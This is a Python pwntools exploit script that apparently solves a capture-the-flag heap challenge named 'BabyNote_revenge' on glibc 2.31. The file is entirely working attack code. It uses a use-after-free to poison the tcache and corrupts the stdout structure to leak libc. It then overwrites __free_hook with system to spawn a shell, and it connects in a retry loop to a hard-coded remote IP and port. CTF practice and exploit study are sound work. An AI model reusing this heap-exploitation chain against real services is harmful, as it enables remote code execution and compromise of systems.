from pwn import *
# context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']



def add(content):
    p.sendlineafter(">>> ",str(1))
    p.sendafter("Input Content:\n",content)
def gift():
    p.sendlineafter(">>> ",str(666))
def delete(id):
    p.sendlineafter(">>> ",str(3))
    p.sendlineafter("Input ID:\n",str(id))
def edit(id,content):
    p.sendlineafter(">>> ",str(2))
    p.sendlineafter("Input ID:\n",str(id))
    p.sendafter("Input Content:\n",content)

def exp():
    add('a'*58)#0
    add('a'*58)#1
    add('a'*58)#2
    for _ in range(8):
        delete(0)
        edit(0,'b'*0x58)
    edit(0,'\x00'*0x10)
    p.sendlineafter(">>> ",'1'*0x450)
    # edit(0,'\xa0\xa6')
    edit(0,'\xa0\x66')


    # stdout_offset = libc.symbols['_IO_2_1_stdout_']
    # log.info("stdout_offset:"+hex(stdout_offset))

    add('c'*0x8)#3
    add(p64(0x0FBAD1887) +p64(0)*3 + p8(0x00))#4
    libc_addr = u64(p.recvuntil('\x7f',timeout=1)[-6:].ljust(8,'\x00'))-(0x7f61c5525980-0x7f61c533a000)#(0x7ffff7f59980-0x7ffff7d6e000)
    #libc_addr:0x7f1eb42b5980
    log.info("libc_addr:"+hex(libc_addr))
    # gdb.attach(p,"b *$rebase(0x13E2)")
    # raw_input()
    free_hook = libc_addr+libc.sym['__free_hook']
    log.info("free_hook:"+hex(free_hook))
    system_addr = libc_addr+libc.sym['system']
    binsh_str = libc_addr+libc.search('/bin/sh').next()

    delete(1)
    edit(1,p64(free_hook)*2)
    add('/bin/sh\x00')
    add(p64(system_addr))


    
    delete(1)

    p.interactive()


# p = process("./BabyNote_revenge",env={'LD_PRELOAD':'./libc-2.31.so'})
# libc = ELF("./libc-2.31.so")
# exp()

if __name__ == '__main__':
    # p = process("./BabyNote_revenge",env={'LD_PRELOAD':'./libc-2.31.so'})
    # libc = ELF("./libc-2.31.so")
    # p = process("./BabyNote_revenge")
    # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    p = remote("8.134.14.168", 10001)
    libc = ELF("./libc-2.31.so")
    while True:
        try:
            exp()
            exit(0)
        except:
            p.close()
            p = remote("8.134.14.168", 10001)
            # p = process("./BabyNote_revenge",env={'LD_PRELOAD':'./libc-2.31.so'})
            # p = process("./BabyNote_revenge")
